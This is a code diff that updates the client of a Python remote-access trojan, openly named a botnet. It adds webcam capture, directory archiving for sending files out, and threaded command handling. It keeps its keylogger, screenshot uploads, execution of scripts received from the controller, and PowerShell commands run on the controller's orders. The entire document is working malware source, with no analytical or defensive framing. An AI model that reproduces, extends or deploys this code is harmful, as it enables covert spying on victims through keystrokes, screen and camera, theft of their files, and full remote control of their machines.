@@ -1,6 +1,6 @@
 from socket import socket,SHUT_WR,AF_INET,SOCK_STREAM
 from base64 import decodebytes
-from os import system , remove , listdir,mkdir,getcwd,chdir
+from os import system , remove , listdir,mkdir,getcwd,chdir,walk
 from os.path import join,basename
 from subprocess import run
 from time import sleep
@@ -10,7 +10,7 @@ from shutil import rmtree
 from threading import Thread
 from datetime import datetime
 from pynput.keyboard import Listener
-from zipfile import ZipFile
+from zipfile import ZipFile,ZIP_DEFLATED
 from numpy import array
 from cv2 import cvtColor,COLOR_RGB2BGR,imwrite
 import cv2
@@ -131,14 +131,28 @@ def send_t_file(path,size=1024):
 	client.send('~~exit~~'.encode('utf-8'))
 
 
-def extract_zip(zip_path):
+def extract_zip(zip_path,extract_path):
 	with ZipFile(zip_path,'r') as f:
 		client.send('ready'.encode('utf-8'))
-		extract_path = client.recv(1024).decode('utf-8')
 		if extract_path=='blank':
 			f.extractall()
 		else:
 			f.extractall(extract_path)
+
+def archive(folder,zip_name):
+	folder = join(folder,'') # to add the / or \ 
+	current_path = getcwd()
+	folder_path  = join(current_path,folder)
+	zip_path     = join(current_path,zip_name)
+
+	chdir(folder)
+
+	with ZipFile(zip_path,'w',compression=ZIP_DEFLATED) as myzip:
+		for root,dirs,files in walk(folder_path):
+			for file in files:
+				root = root.replace(folder_path,'')
+				file = join(root,file)
+				myzip.write(file)
 
 def screenshot():
 	try:
@@ -148,6 +162,27 @@ def screenshot():
 		file_name = 'screenshot.png'
 
 		imwrite(file_name, image)
+
+		with open(file_name,'rb') as f:
+			file_contents=f.read(size)
+			while file_contents:
+				client.send(file_contents)
+				file_contents=f.read(size)
+
+		remove(file_name)
+		reconnect()
+	except Exception as err:
+		print(err)
+
+def take_picture():
+	try:
+		size=1024
+		client.send('ready'.encode('utf-8'))
+		cam = cv2.VideoCapture(0)
+		ret,frame = cam.read()
+		file_name = 'screenshot.png'
+
+		imwrite(file_name,frame)
 
 		with open(file_name,'rb') as f:
 			file_contents=f.read(size)
@@ -187,8 +222,9 @@ def screenshot():
 
 
 def keyboard(option,size=1024):
+	client.send('ready'.encode('utf-8'))
 	if option==1:
-		name = client.recv(size).decode('utf-8')
+		name = 'script.pyw'
 		recv_t_file(name)
 		system(name)
 		remove(name)
@@ -198,8 +234,8 @@ def keyboard(option,size=1024):
 
 	elif option==2:
 		while True:
-			string = client.recv(size).decode('utf-8')
-			if string=='exit':
+			string = client.recv(size).decode('utf-8')+'\n'
+			if string=='exit\n':
 				return
 
 			else:
@@ -240,7 +276,7 @@ def keylogger():
 					string+=key.replace("'","")
 
 	with Listener(on_press=write) as l:
-		if 'logs' not in os.listdir(home):
+		if 'logs' not in listdir(home):
 			mkdir('logs')
 		l.join()
 
@@ -344,13 +380,24 @@ def botnet():
 		elif server_command=='extract zip':
 			client.send('ready'.encode('utf-8'))
 			zip_path = client.recv(1024).decode('utf-8')
-			extract_zip(zip_path)
+			extract_path = client.recv(1024).decode('utf-8')
+			tz = Thread(target=extract_zip,args=(zip_path,extract_path))
+			tz.start()
+
+		elif server_command=='archive directory':
+			client.send('ready'.encode('utf-8'))
+			folder = client.recv(1024).decode('utf-8')
+			client.send('ready'.encode('utf-8'))
+			zip_name     = client.recv(1024).decode('utf-8')
+			
+			ta = Thread(target=archive,args=(folder,zip_name))
+			ta.start()
 
 		elif server_command=='screenshot':
 			screenshot()
 
-		elif server_command=='screenshare':
-			screenshare()
+		elif server_command=='take picture':
+			take_picture()
 
 
 
@@ -364,6 +411,7 @@ def botnet():
 			for obj in listdir():
 				output+=str(obj)+'\n'
 			client.send(output.encode('utf-8'))
+			client.send('~~exit~~'.encode('utf-8'))
 
 		elif server_command[:2]=='cd':
 			chdir(server_command.split()[1])
@@ -391,6 +439,7 @@ def botnet():
 
 
 		elif server_command=='keyboard access':
+			client.send('ready'.encode('utf-8'))
 			option=int(client.recv(1024).decode('utf-8'))
 			keyboard(option)
 
@@ -404,11 +453,13 @@ def botnet():
 
 		elif server_command=='open':
 			try:
+				client.send('ready'.encode('utf-8'))
 				path = client.recv(1024).decode('utf-8')
 				current_path = getcwd()
 				file = basename(path)
 				chdir(path.replace(file,''))
 				system(file)
+				chdir(current_path)
 			except:
 				pass
 
@@ -418,9 +469,11 @@ def botnet():
 		elif server_command=='exit':
 			break
 
-		else:
-			p1=run(['powershell.exe',server_command],shell=True,capture_output=True,text=True)
+		elif server_command=='powershell':
+			client.send('ready'.encode('utf-8'))
+			p1=run(['powershell.exe',client.recv(1024).decode('utf-8')],shell=True,capture_output=True,text=True)
 			client.send(p1.stdout.encode('utf-8'))
+			client.send('~~exit~~'.encode('utf-8'))
 			#client.send('\ncommand was executed\n'.encode('utf-8'))
 
 
